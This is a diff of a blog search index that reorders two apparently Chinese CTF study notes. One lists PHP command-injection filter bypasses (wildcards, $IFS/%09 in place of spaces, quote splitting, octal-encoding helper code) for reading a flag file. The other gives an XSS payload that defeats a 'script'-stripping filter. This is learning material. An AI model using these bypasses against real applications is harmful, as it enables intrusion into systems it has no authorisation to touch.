@@ -154,11 +154,11 @@
   
   
   <entry>
-    <title>rce进阶</title>
-    <link href="/2025/06/11/rce%E8%BF%9B%E9%98%B6/"/>
-    <url>/2025/06/11/rce%E8%BF%9B%E9%98%B6/</url>
+    <title>xss</title>
+    <link href="/2025/06/11/xss%E6%BC%8F%E6%B4%9E/"/>
+    <url>/2025/06/11/xss%E6%BC%8F%E6%B4%9E/</url>
     
-    <content type="html"><![CDATA[<h1 id="rce进阶"><a href="#rce进阶" class="headerlink" title="rce进阶"></a>rce进阶</h1><p>a&#x3D;$a&#x3D;”syst”.”em”;$a(“tac &#x2F;flag”);<br>a&#x3D;echo <code>ls /flag</code>;<br>a&#x3D;print_r(scandir(“.”));  a&#x3D;print_r(file_get_content(“flag&#x2F;php”));</p><p>cmd&#x3D;&#x2F;???&#x2F;?a??64  &#x2F;??a?      &#x2F;&#x2F;禁用字母和符号<br>cmd&#x3D;tac%09&#x2F;flag               &#x2F;&#x2F;禁用空格  %09 $IFS<br>cmd&#x3D;tac &#x2F;flag; || %0a                    &#x2F;&#x2F;绕过 system($cmd.”&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”);<br>c&#x3D;nl&lt;fla’’g.php||                    &#x2F;&#x2F;禁用%</p><p>八进制绕过</p><p><code>&lt;?php</code></p><p><code>function stringToOctal($string) &#123;     $parts = explode(&#39; &#39;, $string);     $octalParts = [];</code></p><pre><code class="hljs">foreach ($parts as $part) &#123;    $octalArray = [];    for ($i = 0; $i &lt; strlen($part); $i++) &#123;        $octalArray[] = sprintf(&#39;%03o&#39;, ord($part[$i]));    &#125;    $octalString = implode(&#39;\\&#39;, $octalArray);    $octalParts[] = &quot;$&#39;\\$octalString&#39;&quot;;&#125;return implode(&#39; &#39;, $octalParts);</code></pre><p><code>&#125;</code></p><p><code>// 将带分隔符的八进制表示转换为字符串</code><br><code>function octalToString($octal) &#123;     $octalParts = explode(&#39; &#39;, $octal);     $stringParts = [];</code></p><pre><code class="hljs">foreach ($octalParts as $part) &#123;    $strippedOctal = substr($part, 2, -1); // 去掉 $&#39; 和 &#39;    $octalArray = explode(&#39;\\&#39;, $strippedOctal);    $string = &#39;&#39;;    foreach ($octalArray as $octalChar) &#123;        $string .= chr(octdec($octalChar));    &#125;    $stringParts[] = $string;&#125;return implode(&#39; &#39;, $stringParts);</code></pre><p><code>&#125;</code></p><p><code>// 示例用法</code><br><code>$originalString = &quot;cat exp.php&quot;; $octal = stringToOctal($originalString);</code></p><p><code>echo &quot;原始字符串: &quot; . $originalString . &quot;            &quot;; echo &quot;八进制表示: &quot; . $octal ;</code></p><p><code>?&gt;</code></p>]]></content>
+    <content type="html"><![CDATA[<h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><h2 id="构造闭合"><a href="#构造闭合" class="headerlink" title="构造闭合"></a>构造闭合</h2><p>  浮生日记 </p><p> title提示让我们弹个窗</p><p> 测过无ssti，结合题目名字，合理可以想到js注入</p><p> 发现替换了script为空，然后赋值给value</p><p> 显然可以先闭合value，然后独立出一个script执行恶意代码</p><p> payload:</p><p>“&gt;<scrscriptipt>alert(1)</scrscriptipt><br>————————————————</p>]]></content>
     
     
     <categories>
@@ -179,11 +179,11 @@
   
   
   <entry>
-    <title>xss</title>
-    <link href="/2025/06/11/xss%E6%BC%8F%E6%B4%9E/"/>
-    <url>/2025/06/11/xss%E6%BC%8F%E6%B4%9E/</url>
+    <title>rce进阶</title>
+    <link href="/2025/06/11/rce%E8%BF%9B%E9%98%B6/"/>
+    <url>/2025/06/11/rce%E8%BF%9B%E9%98%B6/</url>
     
-    <content type="html"><![CDATA[<h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><h2 id="构造闭合"><a href="#构造闭合" class="headerlink" title="构造闭合"></a>构造闭合</h2><p>  浮生日记 </p><p> title提示让我们弹个窗</p><p> 测过无ssti，结合题目名字，合理可以想到js注入</p><p> 发现替换了script为空，然后赋值给value</p><p> 显然可以先闭合value，然后独立出一个script执行恶意代码</p><p> payload:</p><p>“&gt;<scrscriptipt>alert(1)</scrscriptipt><br>————————————————</p>]]></content>
+    <content type="html"><![CDATA[<h1 id="rce进阶"><a href="#rce进阶" class="headerlink" title="rce进阶"></a>rce进阶</h1><p>a&#x3D;$a&#x3D;”syst”.”em”;$a(“tac &#x2F;flag”);<br>a&#x3D;echo <code>ls /flag</code>;<br>a&#x3D;print_r(scandir(“.”));  a&#x3D;print_r(file_get_content(“flag&#x2F;php”));</p><p>cmd&#x3D;&#x2F;???&#x2F;?a??64  &#x2F;??a?      &#x2F;&#x2F;禁用字母和符号<br>cmd&#x3D;tac%09&#x2F;flag               &#x2F;&#x2F;禁用空格  %09 $IFS<br>cmd&#x3D;tac &#x2F;flag; || %0a                    &#x2F;&#x2F;绕过 system($cmd.”&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”);<br>c&#x3D;nl&lt;fla’’g.php||                    &#x2F;&#x2F;禁用%</p><p>八进制绕过</p><p><code>&lt;?php</code></p><p><code>function stringToOctal($string) &#123;     $parts = explode(&#39; &#39;, $string);     $octalParts = [];</code></p><pre><code class="hljs">foreach ($parts as $part) &#123;    $octalArray = [];    for ($i = 0; $i &lt; strlen($part); $i++) &#123;        $octalArray[] = sprintf(&#39;%03o&#39;, ord($part[$i]));    &#125;    $octalString = implode(&#39;\\&#39;, $octalArray);    $octalParts[] = &quot;$&#39;\\$octalString&#39;&quot;;&#125;return implode(&#39; &#39;, $octalParts);</code></pre><p><code>&#125;</code></p><p><code>// 将带分隔符的八进制表示转换为字符串</code><br><code>function octalToString($octal) &#123;     $octalParts = explode(&#39; &#39;, $octal);     $stringParts = [];</code></p><pre><code class="hljs">foreach ($octalParts as $part) &#123;    $strippedOctal = substr($part, 2, -1); // 去掉 $&#39; 和 &#39;    $octalArray = explode(&#39;\\&#39;, $strippedOctal);    $string = &#39;&#39;;    foreach ($octalArray as $octalChar) &#123;        $string .= chr(octdec($octalChar));    &#125;    $stringParts[] = $string;&#125;return implode(&#39; &#39;, $stringParts);</code></pre><p><code>&#125;</code></p><p><code>// 示例用法</code><br><code>$originalString = &quot;cat exp.php&quot;; $octal = stringToOctal($originalString);</code></p><p><code>echo &quot;原始字符串: &quot; . $originalString . &quot;            &quot;; echo &quot;八进制表示: &quot; . $octal ;</code></p><p><code>?&gt;</code></p>]]></content>
     
     
     <categories>
